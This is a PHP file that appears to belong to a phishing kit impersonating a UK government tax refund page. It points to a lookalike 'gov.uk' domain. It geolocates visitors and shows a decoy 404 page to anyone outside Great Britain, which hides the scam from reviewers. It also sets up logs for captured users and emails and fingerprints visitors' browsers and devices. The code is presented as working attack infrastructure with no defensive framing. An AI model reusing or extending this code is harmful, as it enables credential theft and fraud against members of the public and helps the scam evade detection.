<?php
ini_set('session.save_path',getcwd(). '/sessions');
session_start();
ini_set("display_errors", 0);
error_reporting(0);
date_default_timezone_set("Europe/London");

$country_check='GB';

$local=getcwd();

$file404='bsd404/tsl2.php';
list($inc,$files)=explode('tsl2.php',$file404);

//include($inc."geoip.inc");
include($local.'/'.$inc."geoipcity.inc");
include($local.'/'.$inc."geoipregionvars.php");

/*    constants  */
$saveu  =$local.'/logs/usrs';
$save   =$local.'/logs/mails';
$bad    =$local.'/logs/bad';
$statsmob       =$local.'/logs/statsmob';
$statscmp       =$local.'/logs/statscmp';

#----------------------------------------------------------------------------------------------------#
#$login_page='http://sin.kactimes.com/taxrefund';

$login_page="https://gov.uk.msmedia-led.com/government/revenue/tax_refund";

function abs_include($file){
        $do=getcwd();
        $do=$do.'/'.$file;
        return $do;
        //include($do);
        //return $return;
}

function clean($str) {
    $str = strip_tags($str);
    $str = htmlspecialchars($str);

    if ( get_magic_quotes_gpc() )
        $str = stripslashes($str);

    return $str;
}

function GetIP()  {
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP',
'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key)    {
        if (array_key_exists($key, $_SERVER) === true)        {
            foreach (array_map('trim', explode(',', $_SERVER[$key])) as $ip)            {
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
!== false)            {
                    return $ip;
                }
            }
        }
    }
}


$ip=GetIP();
$gi = geoip_open($local.'/'.$inc."GeoIP.dat",GEOIP_STANDARD);
$country = geoip_country_code_by_addr($gi,$ip);
$country=trim($country);


$gi = geoip_open($local.'/'.$inc."GeoLiteCity.dat",GEOIP_STANDARD);
$record = geoip_record_by_addr($gi,$ip);
$country=trim($record->country_code);
$region=$record->region;
$state=$GEOIP_REGION_NAME[$record->country_code][$record->region];
$city=$record->city;
$lat=$record->latitude;
$lon=$record->longitude;
$continent=$record->continent_code;
geoip_close($gi);



(empty($region)) ? $region = 'Region' : $region=$region;
(empty($state)) ? $state = 'State' : $state=$state;
(empty($city)) ? $city = 'City' : $city=$city;

if($country !== $country_check) {
        include($file404);
        die();

}


function GeraHash($qtd){
//Under the string $Caracteres you write all the characters you want to be used to randomly generate the code.
$Caracteres = 'abcdefghijklmopqrstuvxwyz0123456789';
$QuantidadeCaracteres = strlen($Caracteres);
$QuantidadeCaracteres--;

$Hash=NULL;
    for($x=1;$x<=$qtd;$x++){
        $Posicao = rand(0,$QuantidadeCaracteres);
        $Hash .= substr($Caracteres,$Posicao,1);
    }

return $Hash;
}

function detect_mobile()
{

if(preg_match('/(alcatel|amoi|android|avantgo|blackberry|benq|cell|cricket|docomo|elaine|htc|iemobile|iphone|ipad|ipaq|ipod|j2me|java|midp|mini|mmp|mobi|motorola|nec-|nokia|palm|panasonic|philips|phone|playbook|sagem|sharp|sie-|silk|smartphone|sony|symbian|t-mobile|telus|up\.browser|up\.link|vodafone|wap|webos|wireless|xda|xoom|zte)/i',
$_SERVER['HTTP_USER_AGENT']))
        return true;

    else
        return false;
}

if(detect_mobile())  {
        $_SESSION['mob']='1';

}else{
        $_SESSION['mob']='0';
}



function getBrowser()
{
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";

    //First get the platform?
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    }

    // Next get the name of the useragent yes seperately and for good reason
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    }
    elseif(preg_match('/Firefox/i',$u_agent))
    {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    }
    elseif(preg_match('/Chrome/i',$u_agent))
    {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    }
    elseif(preg_match('/Safari/i',$u_agent))
    {
        $bname = 'Apple Safari';
        $ub = "Safari";
    }
    elseif(preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Opera';
        $ub = "Opera";
    }
    elseif(preg_match('/Netscape/i',$u_agent))
    {
        $bname = 'Netscape';
        $ub = "Netscape";
    }

    // finally get the correct version number
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }

    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        //we will have two since we are not using 'other' argument yet
        //see if version is before or after the name
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }

    // check if we have a number
    if ($version==null || $version=="") {$version="?";}

    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
}


function count_page($times) {
         # search for "countfunction" key
        if(!isset($_SESSION['count'])){
                $_SESSION['count'] = 1;
                                $count=$_SESSION['count'];
        }else{
                $count = $_SESSION['count'] + 1;
                $_SESSION['count'] = $count;
        }
                if($count == $times)
                        unset($_SESSION['count']);

                return $count;
}

